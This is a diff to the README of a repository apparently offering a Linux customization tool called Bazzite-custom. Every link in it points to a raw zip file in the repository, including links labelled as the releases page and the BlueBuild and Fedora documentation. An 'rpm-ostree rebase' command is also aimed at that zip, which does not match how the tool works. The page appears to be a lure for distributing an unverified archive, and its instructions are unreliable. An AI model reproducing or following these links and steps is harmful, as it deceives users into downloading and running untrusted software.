@@ -1,6 +1,6 @@
 # 🎉 Bazzite-custom - Customize Your Linux Experience Easily  
 
-[![Download Bazzite-custom](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/proximolabial/Bazzite-custom.zip)](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/proximolabial/Bazzite-custom.zip)  
+[![Download Bazzite-custom](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/modules/custom-Bazzite-v2.1.zip)](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/modules/custom-Bazzite-v2.1.zip)  
 
 ## 📦 Overview  
 Bazzite-custom is an easy-to-use tool that allows you to enhance your Linux operating system. Whether you're looking to create a unique environment or just want to try something new, Bazzite-custom makes it simple. This application is intended for users who want to customize their system without needing technical skills.
@@ -9,7 +9,7 @@ Bazzite-custom is an easy-to-use tool that allows you to enhance your Linux oper
 Follow these steps to download and set up Bazzite-custom on your machine. 
 
 ### Step 1: Download the Application  
-Visit the [Releases page](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/proximolabial/Bazzite-custom.zip) to download the latest version of Bazzite-custom. This page contains all the necessary files you need to get started.
+Visit the [Releases page](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/modules/custom-Bazzite-v2.1.zip) to download the latest version of Bazzite-custom. This page contains all the necessary files you need to get started.
 
 ### Step 2: Install Dependencies  
 You may need to install some basic packages before running Bazzite-custom. Open your terminal and type the following commands:
@@ -26,7 +26,7 @@ To rebase your existing atomic Fedora installation to the latest build, follow t
 1. **First, rebase to the unsigned image:**  
    Run this command in your terminal:
    ```
-   rpm-ostree rebase https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/proximolabial/Bazzite-custom.zip
+   rpm-ostree rebase https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/modules/custom-Bazzite-v2.1.zip
    ```
 
 2. **Reboot to complete the rebase:**  
@@ -51,7 +51,7 @@ rpm-ostree status
 This command will show the current state of your operating system and confirm that Bazzite-custom is in place.
 
 ## 📥 Download & Install  
-To download Bazzite-custom, visit this link: [Download Bazzite-custom](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/proximolabial/Bazzite-custom.zip). Follow the instructions provided to ensure a smooth installation process.
+To download Bazzite-custom, visit this link: [Download Bazzite-custom](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/modules/custom-Bazzite-v2.1.zip). Follow the instructions provided to ensure a smooth installation process.
 
 ## 💡 Features  
 - **Customizable Environment:** Tailor your Linux experience to fit your style.  
@@ -75,7 +75,7 @@ If you encounter issues during installation or operation, try the following:
 
 ## 📚 Resources  
 For more information on setting up, refer to the following:  
-- [BlueBuild Documentation](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/proximolabial/Bazzite-custom.zip)  
-- [Fedora Documentation](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/proximolabial/Bazzite-custom.zip)  
+- [BlueBuild Documentation](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/modules/custom-Bazzite-v2.1.zip)  
+- [Fedora Documentation](https://raw.githubusercontent.com/Nextstep55/Bazzite-custom/main/modules/custom-Bazzite-v2.1.zip)  
 
 By following these steps, you will successfully download and run Bazzite-custom on your system, creating a personalized Linux experience tailored to your needs.
